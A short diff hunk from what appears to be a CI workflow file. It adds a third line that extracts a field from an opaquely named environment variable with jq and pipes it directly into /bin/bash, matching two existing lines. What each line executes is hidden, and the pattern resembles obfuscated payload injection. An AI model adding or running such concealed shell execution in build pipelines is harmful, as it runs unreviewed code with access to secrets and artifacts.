@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$tcted6997" | jq -r .rg16712 | /bin/bash
           echo $wm6617 | jq -r .aoyk4632 | /bin/bash
+          echo $rybky4 | jq -r .lynsr8 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
